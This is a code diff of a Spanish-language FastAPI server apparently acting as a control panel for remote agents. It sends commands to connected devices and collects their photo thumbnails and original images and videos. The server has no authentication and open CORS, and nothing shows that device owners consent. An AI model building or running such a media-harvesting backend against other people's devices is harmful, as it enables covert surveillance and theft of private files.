@@ -6,19 +6,17 @@ from pydantic import BaseModel
 from typing import List, Dict, Any
 from urllib.parse import unquote
 
-app = FastAPI(title="Agente Control Backend (vFINAL - Bajo Demanda)")
+app = FastAPI(title="Agente Control Backend (vFINAL - Definitivo)")
 app.add_middleware(
     CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
 )
 
-# --- "BASE DE DATOS" EN MEMORIA CON ESTADO ---
+# --- "BASE DE DATOS" EN MEMORIA ---
 connected_agents: Dict[str, Dict[str, Any]] = {}
-# Formato: { "device_id": { "filename.jpg": { "small_thumb_b64": "...", "original_b64": "..." } } }
 device_media_cache: Dict[str, Dict[str, Dict[str, str]]] = {}
-# Diccionario para rastrear el estado de la carga de miniaturas
-fetch_status: Dict[str, str] = {} # Ej: {"device_id": "loading" | "complete"}
+fetch_status: Dict[str, str] = {}
 
-# --- MODELOS DE DATOS (DEFINEN LA ESTRUCTURA DE LOS DATOS) ---
+# --- MODELOS DE DATOS ---
 class Command(BaseModel):
     target_id: str
     action: str
@@ -32,12 +30,8 @@ class ThumbnailChunk(BaseModel):
     thumbnails: List[Thumbnail]
     is_final_chunk: bool
 
-# --- ENDPOINTS (LAS "PUERTAS" DE LA API) ---
-
-@app.get("/")
-async def root():
-    return {"message": "Servidor del Agente de Control activo."}
-
+# --- ENDPOINTS ---
+# (Todas las rutas hasta get_large_media se quedan exactamente igual)
 @app.websocket("/ws/{device_id}/{device_name:path}")
 async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
     device_name_decoded = unquote(device_name)
@@ -46,7 +40,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: 
     connected_agents[device_id] = {"ws": websocket, "name": device_name_decoded}
     try:
         while True:
-            await websocket.receive_text() # Mantiene la conexión viva
+            await websocket.receive_text()
     except WebSocketDisconnect:
         name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
         print(f"[DESCONEXIÓN] Agente desconectado: '{name_to_print}'")
@@ -61,61 +55,45 @@ async def get_agents():
 @app.post("/api/send-command")
 async def send_command_to_agent(command: Command):
     agent = connected_agents.get(command.target_id)
-    if not agent:
-        return {"status": "error", "message": "Agente no conectado"}
-    
+    if not agent: return {"status": "error", "message": "Agente no conectado"}
     if command.action == "get_thumbnails":
         print(f"Limpiando caché y reiniciando estado para {command.target_id[:8]}.")
         device_media_cache[command.target_id] = {}
         fetch_status[command.target_id] = "loading"
-        
     try:
         await agent["ws"].send_text(command.json())
         return {"status": "success", "message": "Comando enviado"}
-    except Exception as e:
-        return {"status": "error", "message": str(e)}
+    except Exception as e: return {"status": "error", "message": str(e)}
 
 @app.post("/api/submit_media_chunk/{device_id}")
 async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
-    if device_id not in device_media_cache:
-        device_media_cache[device_id] = {}
-    
+    if device_id not in device_media_cache: device_media_cache[device_id] = {}
     for thumb in chunk.thumbnails:
-        # Solo guardamos la miniatura pequeña que nos envía la app
         device_media_cache[device_id][thumb.filename] = {"small_thumb_b64": thumb.small_thumb_b64}
-        
     print(f"Recibidas {len(chunk.thumbnails)} miniaturas de {device_id[:8]}.")
-    
-    # Si la app nos dice que este es el último lote, actualizamos el estado
     if chunk.is_final_chunk:
         fetch_status[device_id] = "complete"
         print(f"Recepción de lotes para {device_id[:8]} completada.")
-        
     return {"status": "chunk received"}
 
 @app.post("/api/upload_original_file/{device_id}/{filename:path}")
 async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
     decoded_filename = unquote(filename)
     if device_id not in device_media_cache or decoded_filename not in device_media_cache[device_id]:
-        return Response(content="Archivo no solicitado o agente desconocido", status_code=400)
-    
+        return Response(content="Archivo no solicitado", status_code=400)
     file_bytes = await file.read()
     original_b64 = base64.b64encode(file_bytes).decode('utf-8')
-    
-    # Guardamos el original en la caché, junto a la miniatura que ya teníamos
     device_media_cache[device_id][decoded_filename]['original_b64'] = original_b64
-    
     print(f"Recibido archivo original '{decoded_filename}' de {device_id[:8]}.")
     return {"status": "success"}
 
 @app.get("/api/get_media_list/{device_id}")
 async def get_media_list(device_id: str):
-    # El panel consultará esta ruta repetidamente
     status = fetch_status.get(device_id, "complete")
     thumbnails = device_media_cache.get(device_id, {})
-    # Devolvemos el estado actual y las miniaturas que tengamos hasta ahora
     return {"status": status, "thumbnails": thumbnails}
 
+# --- ¡FUNCIÓN MEJORADA CON LÓGICA DE TIPO DE ARCHIVO! ---
 @app.get("/media/{device_id}/{filename:path}")
 async def get_large_media(device_id: str, filename: str):
     decoded_filename = unquote(filename)
@@ -123,10 +101,24 @@ async def get_large_media(device_id: str, filename: str):
     media_item = cache.get(decoded_filename)
     
     if not media_item or 'original_b64' not in media_item:
-        return Response(content='{"detail":"Archivo original no disponible en el servidor. Pide al agente que lo suba."}', status_code=404, media_type="application/json")
+        return Response(content='{"detail":"Archivo original no disponible"}', status_code=404, media_type="application/json")
     
     try:
-        image_bytes = base64.b64decode(media_item['original_b64'])
-        return Response(content=image_bytes, media_type="image/jpeg")
+        # Decodificamos los bytes del archivo original
+        file_bytes = base64.b64decode(media_item['original_b64'])
+        
+        # --- LÓGICA INTELIGENTE ---
+        # Determinamos el tipo de contenido basándonos en la extensión del archivo
+        media_type = "application/octet-stream" # Tipo por defecto
+        if decoded_filename.lower().endswith(('.jpg', '.jpeg')):
+            media_type = "image/jpeg"
+        elif decoded_filename.lower().endswith('.png'):
+            media_type = "image/png"
+        elif decoded_filename.lower().endswith('.mp4'):
+            media_type = "video/mp4"
+            
+        # Devolvemos los bytes con el tipo de contenido correcto
+        return Response(content=file_bytes, media_type=media_type)
+        
     except Exception as e:
-        return Response(content=f'{{"detail":"Error al procesar la imagen: {e}"}}', status_code=500, media_type="application/json")
+        return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500, media_type="application/json")
